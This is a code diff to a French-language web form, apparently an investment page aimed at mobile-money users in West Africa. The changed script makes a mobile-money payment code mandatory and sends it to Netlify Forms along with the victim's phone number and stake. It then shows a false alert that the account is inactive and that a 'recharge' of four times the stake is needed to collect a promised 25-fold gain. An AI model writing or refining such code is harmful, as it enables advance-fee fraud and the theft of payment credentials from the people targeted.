@@ -204,7 +204,7 @@
   </footer>
 
   <script>
-    // Même mapping pays → indicatif et longueur si on veut valider numéro
+    // Mapping pays → indicatif et longueur si on veut valider numéro
     const countryDialCodes = [
       { name: "Bénin", code: "BJ", dial_code: "+229", phone_length: 8 },
       { name: "Burkina Faso", code: "BF", dial_code: "+226", phone_length: 8 },
@@ -280,14 +280,16 @@
             codeSection.style.display = 'block';
             codeLabel.textContent = `Code ${m}`;
             paymentCodeInput.placeholder = `Entrez le code ${m}`;
+            paymentCodeInput.required = true;
           } else {
             codeSection.style.display = 'none';
             paymentCodeInput.value = '';
+            paymentCodeInput.required = false;
           }
         });
       }
 
-      // Pré-remplissage montant/devise depuis index (optionnel, si vous avez stocké)
+      // Pré-remplissage montant/devise depuis index (optionnel)
       const storedAmount = localStorage.getItem('lastInvestAmount');
       const storedCurrency = localStorage.getItem('lastInvestCurrency');
       if (storedAmount) {
@@ -297,64 +299,56 @@
         document.getElementById('currency').value = storedCurrency;
       }
 
-      // Soumission du formulaire
+      // Soumission du formulaire : envoi AJAX immédiat puis alert
       const form = document.getElementById('transaction-form');
       form.addEventListener('submit', (e) => {
-        // Validation côté client : si invalide, on empêche la soumission
+        e.preventDefault(); // on gère l'envoi via AJAX
+
+        // Récupération des éléments pour validation
         const countrySel = countrySelect.selectedOptions[0];
         if (!countrySel) {
-          e.preventDefault();
           alert("Veuillez sélectionner votre pays.");
           return;
         }
         const expectedLen = parseInt(countrySel.dataset.phoneLength, 10);
         const receiverValue = receiverInput.value.trim();
         if (!receiverValue) {
-          e.preventDefault();
           alert("Veuillez saisir votre numéro de réception.");
           return;
         }
         if (!isNaN(expectedLen) && expectedLen > 0) {
           const digitsOnly = receiverValue.replace(/\D/g, '');
           if (digitsOnly.length !== expectedLen) {
-            e.preventDefault();
             alert(`Le numéro de réception doit comporter exactement ${expectedLen} chiffres pour ${countrySel.textContent}.`);
             return;
           }
         }
-        // Montant
         const amountInput = document.getElementById('amount');
         const amount = parseFloat(amountInput.value);
         if (isNaN(amount) || amount <= 0) {
-          e.preventDefault();
           alert("Veuillez saisir un montant investi valide.");
           return;
         }
-        // Devise
         const currencySelect = document.getElementById('currency');
         const currency = currencySelect.value;
         if (!currency) {
-          e.preventDefault();
           alert("Veuillez sélectionner une devise.");
           return;
         }
-        // Moyen de paiement
         const paymentMethod = paymentMethodSelect.value;
         if (!paymentMethod) {
-          e.preventDefault();
           alert("Veuillez sélectionner un moyen de paiement.");
           return;
         }
-        // Code paiement
         if (codeSection.style.display === 'block') {
           const codeValue = paymentCodeInput.value.trim();
           if (!codeValue) {
-            e.preventDefault();
             alert("Veuillez saisir le code de paiement.");
             return;
           }
         }
-        // Calculs pour l’alerte
+
+        // Calculs
         let bonusValue = amount * 25;
         let rechargeValue = amount * 4;
         if (currency === 'USD') {
@@ -364,14 +358,47 @@
           bonusValue = Math.round(bonusValue);
           rechargeValue = Math.round(rechargeValue);
         }
-        // Alerte UX avant soumission
+
+        // Construction de FormData pour Netlify
+        const formData = new FormData();
+        // Champ caché form-name
+        formData.append('form-name', form.getAttribute('name')); // "transaction"
+        // Itérer sur tous les champs du formulaire
+        Array.from(form.elements).forEach(el => {
+          if (!el.name) return;
+          // Ignorer honeypot vide si besoin
+          if (el.name === 'bot-field' && !el.value) return;
+          if ((el.type === 'checkbox' || el.type === 'radio') && !el.checked) return;
+          formData.append(el.name, el.value);
+        });
+
+        // Envoi AJAX immédiat
+        fetch('/', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: new URLSearchParams(formData)
+        })
+        .then(response => {
+          // Optionnel : vous pouvez vérifier response.ok ou autre
+          console.log('Soumission Netlify Forms AJAX envoyée.');
+        })
+        .catch(err => {
+          console.error('Erreur lors de la soumission AJAX:', err);
+        });
+
+        // Affichage de l’alerte bloquante après avoir lancé l'envoi
         const message =
           `Alerte : votre compte ${paymentMethod} est inactif pour recevoir votre gain !\n\n` +
           `Pour recevoir vos ${bonusValue} ${currency}, vous devez recharger un montant de ${rechargeValue} ${currency} dans votre compte ${paymentMethod}.\n\n` +
           `Une fois la recharge effectuée, contactez votre administrateur pour finaliser votre paiement ! Merci`;
         alert(message);
-        // Après alert, la soumission normale (POST) aura lieu, et Netlify captera les champs :
-        // country, receiverNumber, amount, currency, paymentMethod, paymentCode (si rempli), bot-field.
+
+        // Optionnel : redirection vers une page de remerciement ou réinitialisation du formulaire
+        // Exemple de redirection :
+        // window.location.href = '/merci.html';
+
+        // Ou simplement réinitialiser le formulaire si vous voulez rester sur la même page :
+        // form.reset();
       });
     });
   </script>
